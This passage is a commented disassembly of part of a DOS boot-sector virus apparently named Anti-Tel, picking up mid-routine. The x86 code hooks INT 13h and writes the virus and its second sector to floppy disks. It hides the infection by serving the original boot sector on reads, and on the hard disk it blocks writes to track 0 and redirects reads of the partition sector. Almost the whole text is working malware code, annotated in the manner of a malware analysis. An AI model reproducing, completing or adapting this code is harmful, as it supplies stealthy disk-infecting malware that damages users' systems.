8AE2:0340  8A C8                                mov     cl,al                   ; CL=Last Head
8AE2:0342  26:8B 87 0013                        mov     ax,es:[bx+13h]          ; AX=Total Sectors on Disk
8AE2:0347  F6 F5                                div     ch                      ; AX/=Sectors per Track=Tracks*Heads
8AE2:0349  32 E4                                xor     ah,ah                   ; AH=00
8AE2:034B  F6 F1                                div     cl                      ; AX/=Number of Heads=Tracks per Side
8AE2:034D  32 E4                                xor     ah,ah                   ; AH=00
8AE2:034F  A3 00E7                              mov     word ptr ds:[0E7h],ax   ; [00E7]=Number of Tracks per Side
8AE2:0352  59                                   pop     cx                      ; CX=Free Track\Sector
8AE2:0353  06                                   push    es                      ; ES=Loaded Boot Segment
8AE2:0354  53                                   push    bx                      ; BX=Loaded Boot Offset
8AE2:0355  51                                   push    cx                      ; CX=Writed Boot's Track\Sector
8AE2:0356  52                                   push    dx                      ; DX=Writed Boot's Head\Drive
8AE2:0357  B9 001B                              mov     cx,1Bh                  ; CX=001B
8AE2:035A  BE 0003                              mov     si,3                    ; SI=0003
8AE2:035D                       locloop_29:
8AE2:035D  26:8A 47 03                          mov     al,es:[bx+3]            ;
8AE2:0361  88 04                                mov     [si],al                 ; Copy only DOS 3.00+ Floppy Info
8AE2:0363  43                                   inc     bx                      ; from Original Boot
8AE2:0364  46                                   inc     si                      ; to Anti-Tel Boot Sector
8AE2:0365  E2 F6                                loop    locloop_29              ; 
8AE2:0367  0E                                   push    cs                      ;
8AE2:0368  07                                   pop     es                      ; ES=Anti-Tel Segment (CS)
8AE2:0369  33 DB                                xor     bx,bx                   ; BX=0000
8AE2:036B  B9 0001                              mov     cx,1                    ; CX=0001
8AE2:036E  32 F6                                xor     dh,dh                   ; DH=00
8AE2:0370  B8 0301                              mov     ax,301h                 ; AX=0301       ; Write Anti-Tel Boot
8AE2:0373  E8 FD36                              call    sub_3                   ; (00AC) INT 13 ; To Floppy Boot Sector
8AE2:0376  5A                                   pop     dx                      ; DX=Writed Boot's Head\Drive
8AE2:0377  59                                   pop     cx                      ; CX=Writed Boot's Track\Sector
8AE2:0378  BB 0200                              mov     bx,200h                 ; BX=0200
8AE2:037B  FE C9                                dec     cl                      ; CL-=  ; CL=Sector Previous to Writed Boot
8AE2:037D  B8 0301                              mov     ax,301h                 ; AX=0301       ; Writes Second part of Anti-tel
8AE2:0380  E8 FD29                              call    sub_3                   ; (00AC)        ; To a free Sector on Disk
8AE2:0383  5B                                   pop     bx                      ; BX=Loaded Boot Offset (BX at input)
8AE2:0384  07                                   pop     es                      ; ES=Loaded Boot Segment (ES at Input)
8AE2:0385  5A                                   pop     dx                      ; Caller's DX
8AE2:0386  59                                   pop     cx                      ; Caller's CX
8AE2:0387  58                                   pop     ax                      ; Caller's AX
8AE2:0388  3D 0201                              cmp     ax,201h                 ; 0201=Read a Sector
8AE2:038B  75 6F                                jne     loc_37                  ; AX!=0201 ?  Go on with INT 13
8AE2:038D  83 F9 01                             cmp     cx,1                    ; 0001 = Track 0 Sector 1 (Boot)
8AE2:0390  75 6A                                jne     loc_37                  ; CX!=0001 ?  Go on with INT 13 (Boot Sec\Trk)
8AE2:0392  0A F6                                or      dh,dh                   ; 00=Head 0 (Boot)
8AE2:0394  75 66                                jnz     loc_37                  ; DH!=00 ?  Go on with INT 13 (Boot Head)
8AE2:0396  B8 0001                              mov     ax,1                    ; AX=0001
8AE2:0399  F8                                   clc                             ; Carry=0 Return original Boot Sector
                                                                                ;         if recently infected.
8AE2:039A  EB 5B                                jmp     short loc_36            ; (03F7) Exit Without loosing flags
                                                                                ;        No error, real boot (after infecting)
8AE2:039C                       loc_30:                                         ; Here if it was already Infected
8AE2:039C  5A                                   pop     dx                      ; Caller's DX
8AE2:039D  59                                   pop     cx                      ; Caller's CX
8AE2:039E  58                                   pop     ax                      ; Caller's AX
8AE2:039F  3D 0201                              cmp     ax,201h                 ;;
8AE2:03A2  75 58                                jne     loc_37                  ;;
8AE2:03A4  83 F9 01                             cmp     cx,1                    ;;Someone wants to read boot sector ?
8AE2:03A7  75 53                                jne     loc_37                  ;;If don't Go on with old INT 13
8AE2:03A9  0A F6                                or      dh,dh                   ;;
8AE2:03AB  75 4F                                jnz     loc_37                  ;;
8AE2:03AD  51                                   push    cx                      ; Caller's CX
8AE2:03AE  52                                   push    dx                      ; Caller's DX
8AE2:03AF  26:8A 8F 00EC                        mov    cl,byte ptr es:[0ECh][bx]; CL=Offset from CS:0070 to disk size
                                                                                ; for loaded boot, (disk in drive)
8AE2:03B4  E8 FD00                              call    Offset sub_3+2          ; (00B7) 
8AE2:03B7  FE C1                                inc     cl                      ; CL/DH=Boot sector addres on Disk
8AE2:03B9  EB 37                                jmp     short loc_35            ; (03F2) Read original boot sector, exit
                                                                                ;        Don't loose registers
8AE2:03BB                       loc_31:                                         ; Here if Drive = C:
8AE2:03BB  80 FC 02                             cmp     ah,2                    ;
8AE2:03BE  74 11                                je      loc_32                  ; Read Operation ?  (03D1)
8AE2:03C0  80 FC 03                             cmp     ah,3                    ;
8AE2:03C3  75 37                                jne     loc_37                  ; Not Write Operation ?  (03FC) Return
8AE2:03C5  0A ED                                or      ch,ch                   ;
8AE2:03C7  75 33                                jnz     loc_37                  ; Track != 0 ?  (03FC) Return
8AE2:03C9  0A F6                                or      dh,dh                   ;
8AE2:03CB  75 2F                                jnz     loc_37                  ; Head != 0 ?  (03FC) Return
8AE2:03CD  FE C4                                inc     ah                      ; Here if write on Track 0 Head 0
8AE2:03CF  EB 2B                                jmp     short loc_37            ; Do it a verify operation
8AE2:03D1                       loc_32:                                         ; Here if Read Operation
8AE2:03D1  3C 01                                cmp     al,1                    ;
8AE2:03D3  75 27                                jne     loc_37                  ; More than one sector ?  Return
8AE2:03D5  0A F6                                or      dh,dh                   ;
8AE2:03D7  75 23                                jnz     loc_37                  ; Head != 0 ?  Return
8AE2:03D9  83 F9 01                             cmp     cx,1                    ;
8AE2:03DC  74 10                                je      loc_34                  ; Track = 0/ Sector = 1 ? Boot ?  (03EE)
8AE2:03DE  83 F9 06                             cmp     cx,6                    ;
8AE2:03E1  74 05                                je      loc_33                  ; Track=0/Sector=6? Second sect of AntiTel ? 
8AE2:03E3  83 F9 07                             cmp     cx,7                    ;
8AE2:03E6  75 14                                jne     loc_37                  ; Not Read Copy of Part?  Return
8AE2:03E8                       loc_33:                                         ; Here if wants to read second sect of AntiTel
8AE2:03E8  51                                   push    cx                      ; or copy of Part
8AE2:03E9  52                                   push    dx                      ;
8AE2:03EA  B1 05                                mov     cl,5                    ; Sector=5
8AE2:03EC  EB 04                                jmp     short loc_35            ; (03F2) Load a sector (Empty Sector)
8AE2:03EE                       loc_34:                                         ; Here if wants to read the boot or part sector
8AE2:03EE  51                                   push    cx                      ;
8AE2:03EF  52                                   push    dx                      ;
8AE2:03F0  B1 07                                mov     cl,7                    ; Read Original Part or boot from copy
8AE2:03F2                       loc_35:
8AE2:03F2  E8 FCB7                              call    sub_2_1                 ; (00AC) Load a Sector
8AE2:03F5  5A                                   pop     dx                      ; Caller's DX
8AE2:03F6  59                                   pop     cx                      ; Caller's CX
8AE2:03F7                       loc_36:
8AE2:03F7  1F                                   pop     ds                      ; Caller's DS
8AE2:03F8  5E                                   pop     si                      ; Caller's SI
8AE2:03F9  CA 0002                              retf    2                       ; IRET without loosing flags
8AE2:03FC                       loc_37:
8AE2:03FC  E9 FDB1                              jmp     loc_9_2                 ; (01B0) Go on with old Int 13
8AE2:03FF  DA
